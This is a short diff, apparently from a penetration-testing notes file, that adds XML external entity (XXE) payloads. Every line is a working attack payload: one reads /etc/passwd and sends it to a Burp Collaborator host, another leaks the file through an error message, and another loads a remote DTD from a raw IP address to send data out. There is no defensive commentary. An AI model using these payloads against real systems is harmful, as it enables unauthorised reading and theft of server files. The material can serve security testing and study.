@@ -7,7 +7,17 @@
 _<ENTITY % file SYSTEM “file:///etc/passwd”> 
 <ENTITY % eval “<ENTITY &#x25; exfil SYSTEM ‘http://burpcollaborator.oastify.com/?_**_x_**_=%file;’>”> %eval; %exfil;_
 
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
 
+<!DOCTYPE roottag [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "http://122.180.248.81/payload.dtd">
+  %dtd;
+]>
+<GeneralSearch>&send;</GeneralSearch>
 
 ```
 
